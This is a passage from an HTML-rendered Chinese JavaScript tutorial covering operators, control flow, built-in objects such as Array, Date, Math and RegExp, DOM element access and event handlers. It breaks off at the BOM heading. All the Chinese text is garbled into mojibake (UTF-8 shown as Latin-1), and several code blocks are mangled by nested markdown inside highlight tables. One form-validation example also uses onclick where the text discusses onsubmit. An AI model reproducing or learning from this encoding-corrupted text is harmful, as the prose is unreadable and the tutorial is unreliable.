===ï¼šå…¨ç­‰äºã€‚åœ¨æ¯”è¾ƒä¹‹å‰ï¼Œå…ˆåˆ¤æ–­ç±»å‹ï¼Œå¦‚æœç±»å‹ä¸ä¸€æ ·ï¼Œåˆ™ç›´æ¥è¿”å›false</li></ol></blockquote></li></ul></li><li><p>é€»è¾‘è¿ç®—ç¬¦</p><ul><li>&& || ! ï¼ˆ&& ||ä¹Ÿæœ‰çŸ­è·¯æ•ˆæœï¼‰</li></ul><blockquote><p>å…¶ä»–ç±»å‹è½¬booleanï¼š</p><ol><li><p>numberï¼š<u>0æˆ–NaNä¸ºå‡</u>ï¼Œå…¶ä»–ä¸ºçœŸ</p></li><li><p>stringï¼šé™¤äº†ç©ºå­—ç¬¦ä¸²("")ï¼Œå…¶ä»–éƒ½æ˜¯true</p></li><li><p>null&undefined:éƒ½æ˜¯false</p></li><li><p>å¯¹è±¡ï¼šæ‰€æœ‰å¯¹è±¡éƒ½ä¸ºtrue</p></li></ol></blockquote><p>â€‹</p></li></ul></li></ol><p></p><h4 id="6-ä¸‰å…ƒè¿ç®—ç¬¦"><a href="#6-ä¸‰å…ƒè¿ç®—ç¬¦" class="headerlink" title="6. ä¸‰å…ƒè¿ç®—ç¬¦"></a>6. ä¸‰å…ƒè¿ç®—ç¬¦</h4><ul><li><p>? : è¡¨è¾¾å¼</p><ul><li><pre><code class="js">var a = 3;var b = 4;var c = a &gt; b ? 1:0;<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    &gt; è¯­æ³•ï¼š</span><br><span class="line">    &gt;</span><br><span class="line">    &gt; * è¡¨è¾¾å¼? å€¼1:å€¼2;</span><br><span class="line">    &gt;</span><br><span class="line">    &gt; * åˆ¤æ–­è¡¨è¾¾å¼çš„å€¼ï¼Œå¦‚æœæ˜¯trueåˆ™å–å€¼1ï¼Œå¦‚æœæ˜¯falseåˆ™å–å€¼2</span><br><span class="line"></span><br><span class="line">### æµç¨‹æ§åˆ¶è¯­å¥</span><br><span class="line"></span><br><span class="line">1. if...else...</span><br><span class="line">2. switch:</span><br><span class="line"></span><br><span class="line">  * åœ¨javaä¸­ï¼Œswitchè¯­å¥å¯ä»¥æ¥å—çš„æ•°æ®ç±»å‹ï¼š byte int short char,æšä¸¾(1.5) ,String(1.7)</span><br><span class="line"></span><br><span class="line">    ```js</span><br><span class="line">    switch(å˜é‡)&#123;</span><br><span class="line">    case å€¼:</span><br><span class="line">    &#125; //åŒä¸€ä¸ªswitchå†…çš„caseåçš„å€¼ç±»å‹å¯ä»¥æ··åˆ</span><br></pre></td></tr></table></figure></div></code></pre></li></ul><ul><li>åœ¨JSä¸­,switchè¯­å¥å¯ä»¥æ¥å—ä»»æ„çš„åŸå§‹æ•°æ®ç±»å‹</li></ul></li></ul><ol start="3"><li>while</li><li>do...while</li><li>for</li></ol><h3 id="ç‰¹æ®Šè¯­æ³•"><a href="#ç‰¹æ®Šè¯­æ³•" class="headerlink" title="ç‰¹æ®Šè¯­æ³•"></a>ç‰¹æ®Šè¯­æ³•</h3><ul><li><p>è¯­å¥ä»¥;ç»“å°¾ï¼Œå¦‚æœä¸€è¡Œåªæœ‰ä¸€æ¡è¯­å¥åˆ™ ;å¯ä»¥çœç•¥ (ä¸å»ºè®®)</p></li><li><p>å˜é‡çš„å®šä¹‰ä½¿ç”¨varå…³é”®å­—ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨</p><ul><li><p>ç”¨varï¼š å®šä¹‰çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡</p><ul><li>ä¸ç”¨varï¼šå®šä¹‰çš„å˜é‡æ˜¯å…¨å±€å˜é‡(ä¸å»ºè®®)</li></ul></li></ul></li></ul><h3 id="ç»ƒä¹ -99ä¹˜æ³•è¡¨"><a href="#ç»ƒä¹ -99ä¹˜æ³•è¡¨" class="headerlink" title="ç»ƒä¹ --99ä¹˜æ³•è¡¨"></a>ç»ƒä¹ --99ä¹˜æ³•è¡¨</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    td&#123;</span><br><span class="line">        <span class="attr">border</span>:1px solid ;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;table  align=&#x27;center&#x27;&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;tr&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;td&gt;&quot;</span>)</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(i+<span class="string">&quot;*&quot;</span>+j+<span class="string">&quot;=&quot;</span>+i*j+<span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;/td&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// document.write(&quot;&lt;br&gt;&quot;)</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;/tr&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h2><h3 id="åŸºæœ¬å¯¹è±¡"><a href="#åŸºæœ¬å¯¹è±¡" class="headerlink" title="åŸºæœ¬å¯¹è±¡"></a>åŸºæœ¬å¯¹è±¡</h3><h4 id="1-Functionï¼šå‡½æ•°-æ–¹æ³•-å¯¹è±¡"><a href="#1-Functionï¼šå‡½æ•°-æ–¹æ³•-å¯¹è±¡" class="headerlink" title="1. Functionï¼šå‡½æ•°(æ–¹æ³•)å¯¹è±¡"></a>1. Functionï¼šå‡½æ•°(æ–¹æ³•)å¯¹è±¡</h4><ul><li><p>åˆ›å»º</p><ul><li><p>var fun = new Function(å½¢å¼å‚æ•°åˆ—è¡¨,æ–¹æ³•ä½“); ï¼ˆäº†è§£å³å¯ï¼‰</p></li><li><pre><code class="js">function æ–¹æ³•åç§°(å½¢å¼å‚æ•°åˆ—è¡¨)&#123;    æ–¹æ³•ä½“&#125;<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```js</span><br><span class="line">  var æ–¹æ³•å = function(å½¢å¼å‚æ•°åˆ—è¡¨)&#123;</span><br><span class="line">      æ–¹æ³•ä½“</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div></code></pre></li></ul><blockquote><p>æ–¹æ³•å¯ä»¥é‡å¤å£°æ˜ï¼Œä¸ä¼šæŠ¥é”™ï¼Œæœ€æ–°ç‰ˆæœ¬ä¼šè¦†ç›–æ—§ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥ç”¨ä»¥ä¸‹æ ¼å¼é‡æ–°å®šä¹‰æ–¹æ³•</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•å = <span class="keyword">function</span>(<span class="params">å½¢å¼å‚æ•°åˆ—è¡¨</span>)&#123;</span><br><span class="line"> æ–¹æ³•ä½“</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote></li><li><p>å±æ€§</p><ul><li>length:ä»£è¡¨å½¢å‚çš„ä¸ªæ•°</li></ul></li><li><p>ç‰¹ç‚¹</p><ul><li><p>æ–¹æ³•å®šä¹‰æ˜¯ï¼Œå½¢å‚çš„ç±»å‹ä¸ç”¨å†™,è¿”å›å€¼ç±»å‹ä¹Ÿä¸å†™ã€‚</p><ol start="2"><li>æ–¹æ³•æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœå®šä¹‰åç§°ç›¸åŒçš„æ–¹æ³•ï¼Œä¼šè¦†ç›–</li></ol><ul><li>åœ¨JSä¸­ï¼Œæ–¹æ³•çš„è°ƒç”¨åªä¸æ–¹æ³•çš„åç§°æœ‰å…³ï¼Œå’Œå‚æ•°åˆ—è¡¨æ— å…³ ï¼ˆjsæ²¡æœ‰æ–¹æ³•é‡è½½ï¼‰<ul><li>å‚æ•°ä¼ å¤šä¼ å°‘éƒ½èƒ½æ‰§è¡Œï¼Œä¼ å°‘çš„è¯ï¼Œæ²¡æ¥æ”¶åˆ°æ•°æ®çš„å½¢å‚ä¸ºundefinedï¼Œä¼ å¤šä¹Ÿä¸æŠ¥é”™</li></ul></li></ul><ol start="4"><li>åœ¨æ–¹æ³•å£°æ˜ä¸­æœ‰ä¸€ä¸ªéšè—çš„å†…ç½®å¯¹è±¡ï¼ˆæ•°ç»„ï¼‰ï¼Œarguments,å°è£…æ‰€æœ‰çš„å®é™…å‚æ•°</li></ol></li></ul></li><li><p>è°ƒç”¨ï¼š<br>æ–¹æ³•åç§°(å®é™…å‚æ•°åˆ—è¡¨);</p></li></ul><h4 id="2-Array-æ•°ç»„å¯¹è±¡"><a href="#2-Array-æ•°ç»„å¯¹è±¡" class="headerlink" title="2. Array:æ•°ç»„å¯¹è±¡"></a>2. Array:æ•°ç»„å¯¹è±¡</h4><ul><li>åˆ›å»ºï¼š<ul><li>var arr = new Array(å…ƒç´ åˆ—è¡¨);</li><li>var arr = new Array(é»˜è®¤é•¿åº¦);</li><li>var arr = [å…ƒç´ åˆ—è¡¨];</li></ul></li><li>æ–¹æ³•<ul><li>join(åˆ†éš”ç¬¦):å°†æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰ç…§æŒ‡å®šçš„åˆ†éš”ç¬¦æ‹¼æ¥ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ†éš”ç¬¦é»˜è®¤ä¸ºé€—å·(,)</li><li>push():å‘æ•°ç»„çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªæˆ–æ›´å¤šå…ƒç´ ï¼Œ<u>å¹¶è¿”å›æ–°çš„é•¿åº¦</u>ã€‚</li></ul></li><li>ç‰¹ç‚¹ï¼š<ul><li>JSä¸­ï¼Œæ•°ç»„å…ƒç´ çš„ç±»å‹å¯å˜çš„ã€‚</li><li>JSä¸­ï¼Œæ•°ç»„é•¿åº¦å¯å˜çš„ã€‚æ“ä½œè¶…å‡ºåŸå§‹é•¿åº¦çš„å…ƒç´ æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰©å®¹</li><li>æ‰“å°æ•°ç»„å¯¹è±¡ï¼Œé»˜è®¤ç”¨é€—å·å°†æ‰€æœ‰å…ƒç´ è¿æ¥æˆå­—ç¬¦ä¸²</li></ul></li></ul><h4 id="3-Boolean"><a href="#3-Boolean" class="headerlink" title="3. Boolean"></a>3. Boolean</h4><ul><li>å±æ€§<ul><li>constructor ï¼šè¿”å›æ„é€ æ–¹æ³•çš„å¼•ç”¨</li><li>prototypeï¼šè¿”å›å¯¹è±¡ç±»å‹åŸå‹çš„å¼•ç”¨</li></ul></li><li>æ–¹æ³•<ul><li>toSource() è¿”å›è¯¥å¯¹è±¡æºç </li><li>toString()</li><li>valueOf() è¿”å›Booleanå¯¹è±¡åŸå§‹å€¼</li></ul></li></ul><h4 id="4-Dateï¼šæ—¥æœŸå¯¹è±¡"><a href="#4-Dateï¼šæ—¥æœŸå¯¹è±¡" class="headerlink" title="4. Dateï¼šæ—¥æœŸå¯¹è±¡"></a>4. Dateï¼šæ—¥æœŸå¯¹è±¡</h4><ul><li>åˆ›å»ºï¼š<ul><li>var date = new Date();</li></ul></li><li>æ–¹æ³•ï¼š<ul><li>toLocaleString()ï¼šè¿”å›å½“å‰dateå¯¹è±¡å¯¹åº”çš„æ—¶é—´æœ¬åœ°å­—ç¬¦ä¸²æ ¼å¼</li><li>getTime():è·å–æ¯«ç§’å€¼ã€‚è¿”å›å½“å‰å¦‚æœŸå¯¹è±¡æè¿°çš„æ—¶é—´åˆ°1970å¹´1æœˆ1æ—¥é›¶ç‚¹çš„æ¯«ç§’å€¼å·®</li></ul></li></ul><h4 id="5-Mathï¼šæ•°å­¦å¯¹è±¡"><a href="#5-Mathï¼šæ•°å­¦å¯¹è±¡" class="headerlink" title="5. Mathï¼šæ•°å­¦å¯¹è±¡"></a>5. Mathï¼šæ•°å­¦å¯¹è±¡</h4><ul><li><p>åˆ›å»ºï¼š<br>* ç‰¹ç‚¹ï¼šMathå¯¹è±¡ä¸ç”¨åˆ›å»ºï¼Œç›´æ¥ä½¿ç”¨ã€‚  Math.æ–¹æ³•å();</p></li><li><p>æ–¹æ³•ï¼š</p><ul><li>random():è¿”å› 0 ~ 1 ä¹‹é—´çš„éšæœºæ•°ã€‚ å«0ä¸å«1</li><li>ceil(x)ï¼šå¯¹æ•°è¿›è¡Œä¸Šèˆå…¥ã€‚</li><li>floor(x)ï¼šå¯¹æ•°è¿›è¡Œä¸‹èˆå…¥ã€‚</li><li>round(x)ï¼šæŠŠæ•°å››èˆäº”å…¥ä¸ºæœ€æ¥è¿‘çš„æ•´æ•°ã€‚</li></ul></li><li><p>å±æ€§ï¼š</p><ul><li>PI</li></ul></li></ul><h4 id="6-Numberã€String-åŸºæœ¬æ•°æ®ç±»å‹åŒ…è£…ç±»ï¼ˆä¸Booleanä¸€æ ·ï¼‰"><a href="#6-Numberã€String-åŸºæœ¬æ•°æ®ç±»å‹åŒ…è£…ç±»ï¼ˆä¸Booleanä¸€æ ·ï¼‰" class="headerlink" title="6. Numberã€String åŸºæœ¬æ•°æ®ç±»å‹åŒ…è£…ç±»ï¼ˆä¸Booleanä¸€æ ·ï¼‰"></a>6. Numberã€String åŸºæœ¬æ•°æ®ç±»å‹åŒ…è£…ç±»ï¼ˆä¸Booleanä¸€æ ·ï¼‰</h4><h4 id="7-RegExpï¼šæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡"><a href="#7-RegExpï¼šæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡" class="headerlink" title="7. RegExpï¼šæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡"></a>7. RegExpï¼šæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡</h4><ul><li><p>æ­£åˆ™è¡¨è¾¾å¼ï¼šå®šä¹‰å­—ç¬¦ä¸²çš„ç»„æˆè§„åˆ™ã€‚</p><ul><li><p>å•ä¸ªå­—ç¬¦:[]</p><ul><li><p>å¦‚ï¼š [a] [ab] [a-zA-Z0-9_]</p><pre><code>* ç‰¹æ®Šç¬¦å·ä»£è¡¨ç‰¹æ®Šå«ä¹‰çš„å•ä¸ªå­—ç¬¦:</code></pre><ul><li>\d:å•ä¸ªæ•°å­—å­—ç¬¦ [0-9]</li><li>\w:å•ä¸ªå•è¯å­—ç¬¦[a-zA-Z0-9_]</li></ul></li></ul></li><li><p>é‡è¯ç¬¦å·ï¼š</p><ul><li>?ï¼šè¡¨ç¤ºå‡ºç°0æ¬¡æˆ–1æ¬¡</li><li>*ï¼šè¡¨ç¤ºå‡ºç°0æ¬¡æˆ–å¤šæ¬¡</li><li>+ï¼šå‡ºç°1æ¬¡æˆ–å¤šæ¬¡</li><li>{m,n}:è¡¨ç¤º m<= æ•°é‡ <= n<ul><li>må¦‚æœç¼ºçœï¼š {,n}:æœ€å¤šnæ¬¡</li><li>nå¦‚æœç¼ºçœï¼š{m,} æœ€å°‘mæ¬¡</li></ul></li></ul></li><li><p>å¼€å§‹ç»“æŸç¬¦å·</p><ul><li>^:å¼€å§‹</li><li>$:ç»“æŸ</li></ul></li></ul></li><li><p>æ­£åˆ™å¯¹è±¡ï¼š</p><ul><li><p>åˆ›å»º</p><ul><li>var reg = new RegExp("æ­£åˆ™è¡¨è¾¾å¼");</li><li>var reg = /æ­£åˆ™è¡¨è¾¾å¼/;</li></ul></li><li><p>æ–¹æ³•</p><ul><li>test(å‚æ•°):éªŒè¯æŒ‡å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆæ­£åˆ™å®šä¹‰çš„è§„èŒƒ</li></ul></li></ul></li></ul><p></p><h4 id="8-Global"><a href="#8-Global" class="headerlink" title="8. Global"></a>8. Global</h4><ul><li><p>ç‰¹ç‚¹ï¼šå…¨å±€å¯¹è±¡ï¼Œè¿™ä¸ªGlobalä¸­å°è£…çš„æ–¹æ³•ä¸éœ€è¦å¯¹è±¡å°±å¯ä»¥ç›´æ¥è°ƒç”¨ã€‚  æ–¹æ³•å();</p></li><li><p>æ–¹æ³•ï¼š</p><ul><li><p>encodeURI():urlç¼–ç </p></li><li><p>decodeURI():urlè§£ç </p></li><li><p>encodeURIComponent():urlç¼–ç ,<u>ç¼–ç çš„å­—ç¬¦æ›´å¤š</u></p></li><li><p>decodeURIComponent():urlè§£ç </p></li><li><p>parseInt():å°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—</p><ul><li>é€ä¸€åˆ¤æ–­æ¯ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯æ•°å­—ï¼Œç›´åˆ°ä¸æ˜¯æ•°å­—ä¸ºæ­¢ï¼Œå°†å‰è¾¹æ•°å­—éƒ¨åˆ†è½¬ä¸ºnumber</li></ul></li><li><p>isNaN():åˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯NaN</p><ul><li>NaNå…­äº²ä¸è®¤ï¼Œè¿è‡ªå·±éƒ½ä¸è®¤ã€‚NaNå‚ä¸çš„==æ¯”è¾ƒå…¨éƒ¨ä¸ºfalseï¼Œå› æ­¤åˆ¤æ–­è¦ç”¨isNaNå‡½æ•°</li></ul></li><li><p>eval(): ä¼ å…¥JavaScriptä»£ç å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œã€‚</p></li></ul></li></ul><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="ç®€å•å­¦ä¹ "><a href="#ç®€å•å­¦ä¹ " class="headerlink" title="ç®€å•å­¦ä¹ "></a>ç®€å•å­¦ä¹ </h3><ul><li><p>åŠŸèƒ½ï¼šæ§åˆ¶htmlæ–‡æ¡£çš„å†…å®¹</p></li><li><p>è·å–é¡µé¢æ ‡ç­¾(å…ƒç´ )å¯¹è±¡ï¼šElement</p><ul><li>document.getElementById("idå€¼"):é€šè¿‡å…ƒç´ çš„idè·å–å…ƒç´ å¯¹è±¡</li></ul></li><li><p>æ“ä½œElementå¯¹è±¡ï¼š</p><ol><li><p>ä¿®æ”¹å±æ€§å€¼ï¼š</p><ol><li>æ˜ç¡®è·å–çš„å¯¹è±¡æ˜¯å“ªä¸€ä¸ª</li><li>æŸ¥çœ‹APIæ–‡æ¡£ï¼Œæ‰¾å…¶ä¸­æœ‰å“ªäº›å±æ€§å¯ä»¥è®¾ç½®</li></ol></li><li><p>ä¿®æ”¹æ ‡ç­¾ä½“å†…å®¹ï¼š</p><ul><li>å±æ€§ï¼šinnerHTML</li></ul><ol><li>è·å–å…ƒç´ å¯¹è±¡</li><li>ä½¿ç”¨innerHTMLå±æ€§ä¿®æ”¹æ ‡ç­¾ä½“å†…å®¹</li></ol></li></ol></li></ul><h2 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h2><h3 id="ç®€å•å­¦ä¹ -1"><a href="#ç®€å•å­¦ä¹ -1" class="headerlink" title="ç®€å•å­¦ä¹ "></a>ç®€å•å­¦ä¹ </h3><ul><li>åŠŸèƒ½ï¼š æŸäº›ç»„ä»¶è¢«æ‰§è¡Œäº†æŸäº›æ“ä½œåï¼Œè§¦å‘æŸäº›ä»£ç çš„æ‰§è¡Œã€‚</li></ul><ul><li><p>å¦‚ä½•ç»‘å®šäº‹ä»¶</p><ul><li>ç›´æ¥åœ¨htmlæ ‡ç­¾ä¸Šï¼ŒæŒ‡å®šäº‹ä»¶çš„å±æ€§(æ“ä½œ)ï¼Œå±æ€§å€¼å°±æ˜¯jsä»£ç <ul><li>äº‹ä»¶ï¼šonclick--- å•å‡»äº‹ä»¶</li></ul></li></ul><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;light&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/off.gif&quot;</span>  <span class="attr">onclick</span>=<span class="string">&quot;jsä»£ç &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ä¹Ÿå¯ä»¥æŠŠjsä»£ç æ‰§è¡Œå°è£…æˆå‡½æ•°ï¼Œjsä»£ç å¤„åªå†™å‡½æ•°</p></blockquote><ul><li>é€šè¿‡jsè·å–å…ƒç´ å¯¹è±¡ï¼ŒæŒ‡å®šäº‹ä»¶å±æ€§ï¼Œè®¾ç½®ä¸€ä¸ªå‡½æ•°</li></ul></li></ul><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.è·å–light2å¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> light2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;light2&quot;</span>);</span><br><span class="line"><span class="comment">//2.ç»‘å®šäº‹ä»¶</span></span><br><span class="line">light2.<span class="property">onclick</span> = fun2;</span><br></pre></td></tr></table></figure></div><h3 id="äº‹ä»¶ç›‘å¬æœºåˆ¶ï¼š"><a href="#äº‹ä»¶ç›‘å¬æœºåˆ¶ï¼š" class="headerlink" title="äº‹ä»¶ç›‘å¬æœºåˆ¶ï¼š"></a>äº‹ä»¶ç›‘å¬æœºåˆ¶ï¼š</h3><ul><li><p>æ¦‚å¿µï¼šæŸäº›ç»„ä»¶è¢«æ‰§è¡Œäº†æŸäº›æ“ä½œåï¼Œè§¦å‘æŸäº›ä»£ç çš„æ‰§è¡Œã€‚</p><ul><li>äº‹ä»¶ï¼šæŸäº›æ“ä½œã€‚å¦‚ï¼š å•å‡»ï¼ŒåŒå‡»ï¼Œé”®ç›˜æŒ‰ä¸‹äº†ï¼Œé¼ æ ‡ç§»åŠ¨äº†</li><li>äº‹ä»¶æºï¼šç»„ä»¶ã€‚å¦‚ï¼š æŒ‰é’® æ–‡æœ¬è¾“å…¥æ¡†...</li><li>ç›‘å¬å™¨ï¼šä»£ç ã€‚</li><li>æ³¨å†Œç›‘å¬ï¼šå°†äº‹ä»¶ï¼Œäº‹ä»¶æºï¼Œç›‘å¬å™¨ç»“åˆåœ¨ä¸€èµ·ã€‚ å½“äº‹ä»¶æºä¸Šå‘ç”Ÿäº†æŸä¸ªäº‹ä»¶ï¼Œåˆ™è§¦å‘æ‰§è¡ŒæŸä¸ªç›‘å¬å™¨ä»£ç ã€‚</li></ul></li><li><p>å¸¸è§çš„äº‹ä»¶ï¼š</p><ol><li><p>ç‚¹å‡»äº‹ä»¶ï¼š</p></li><li><p>onclickï¼šå•å‡»äº‹ä»¶</p></li><li><p>ondblclickï¼šåŒå‡»äº‹ä»¶</p></li><li><p>ç„¦ç‚¹äº‹ä»¶</p></li><li><p>onblurï¼šå¤±å»ç„¦ç‚¹</p><ul><li>ä¸€èˆ¬ç”¨äºè¡¨å•éªŒè¯</li></ul></li><li><p>onfocus:å…ƒç´ è·å¾—ç„¦ç‚¹ã€‚</p></li><li><p>åŠ è½½äº‹ä»¶ï¼š</p></li><li><p>onloadï¼šä¸€å¼ é¡µé¢æˆ–ä¸€å¹…å›¾åƒå®ŒæˆåŠ è½½ã€‚</p><ul><li>å¯ä»¥è®¾ç½®windowçš„è¯¥äº‹ä»¶è§¦å‘å‡½æ•°ä¸ºè¦ä½¿ç”¨çš„jsä»£ç ï¼Œè¿™æ ·å¯ä»¥æŠŠjsæ ‡ç­¾æ”¾åœ¨headé‡Œï¼Œä¸ä¼šæŠ¥é”™æ‰¾ä¸åˆ°æ ‡ç­¾ï¼ˆå› ä¸ºæ ‡ç­¾åŠ è½½å®Œæˆæ‰æ‰§è¡Œï¼‰</li></ul></li><li><p>é¼ æ ‡äº‹ä»¶ï¼š</p></li><li><p>onmousedowné¼ æ ‡æŒ‰é’®è¢«æŒ‰ä¸‹ã€‚</p><ul><li>å®šä¹‰æ–¹æ³•æ—¶ï¼Œå®šä¹‰ä¸€ä¸ªå½¢å‚ï¼Œæ¥å—eventå¯¹è±¡ã€‚</li><li>eventå¯¹è±¡çš„buttonå±æ€§å¯ä»¥è·å–é¼ æ ‡æŒ‰é’®é”®è¢«ç‚¹å‡»äº†ã€‚</li></ul></li><li><p>onmouseupé¼ æ ‡æŒ‰é”®è¢«æ¾å¼€ã€‚</p></li><li><p>onmousemoveé¼ æ ‡è¢«ç§»åŠ¨ã€‚</p></li><li><p>onmouseoveré¼ æ ‡ç§»åˆ°æŸå…ƒç´ ä¹‹ä¸Šã€‚</p></li><li><p>onmouseouté¼ æ ‡ä»æŸå…ƒç´ ç§»å¼€ã€‚</p></li><li><p>é”®ç›˜äº‹ä»¶ï¼š</p><ol><li>onkeydownæŸä¸ªé”®ç›˜æŒ‰é”®è¢«æŒ‰ä¸‹ã€‚</li><li>onkeyupæŸä¸ªé”®ç›˜æŒ‰é”®è¢«æ¾å¼€ã€‚</li><li>onkeypressæŸä¸ªé”®ç›˜æŒ‰é”®è¢«æŒ‰ä¸‹å¹¶æ¾å¼€ã€‚</li></ol></li><li><p>é€‰æ‹©å’Œæ”¹å˜</p><ol><li>onchangeåŸŸçš„å†…å®¹è¢«æ”¹å˜ã€‚</li><li>onselectæ–‡æœ¬è¢«é€‰ä¸­ã€‚</li></ol></li><li><p>è¡¨å•äº‹ä»¶ï¼š</p><ol><li><p>onsubmitç¡®è®¤æŒ‰é’®è¢«ç‚¹å‡»ã€‚</p><ul><li>å¯ä»¥é˜»æ­¢è¡¨å•çš„æäº¤</li><li>æ–¹æ³•è¿”å›falseåˆ™è¡¨å•è¢«é˜»æ­¢æäº¤ã€‚</li></ul><blockquote><p>å°è£…åœ¨æ ‡ç­¾å±æ€§ä¸­æ—¶æ³¨æ„æ‰§è¡Œçš„jsä»£ç </p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkForm</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//æ ¡éªŒ</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> id=<span class="string">&quot;form&quot;</span> onclick=<span class="string">&quot;return checkForm();&quot;</span>&gt; <span class="comment">//è¦returnæ ¡éªŒå‡½æ•°ï¼Œå› ä¸ºåº•å±‚æ˜¯å°†onclickåjsä»£ç å°è£…æˆå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°èµ‹å€¼ç»™æ ‡ç­¾çš„onclickäº‹ä»¶ï¼Œçœ‹çš„æ˜¯è¯¥å‡½æ•°è¿”å›å€¼ï¼Œå¦‚æœåªæœ‰ä¸€è¡Œæ‰§è¡Œæ ¡éªŒå‡½æ•°ï¼Œåˆ™æ²¡æœ‰è¿”å›å€¼</span></span><br></pre></td></tr></table></figure></div></blockquote></li><li><p>onreseté‡ç½®æŒ‰é’®è¢«ç‚¹å‡»ã€‚</p></li></ol></li></ol></li></ul><h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h2><h3 id="æ¦‚å¿µ-3"><a href="#æ¦‚å¿µ-3" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>Browser Object Model 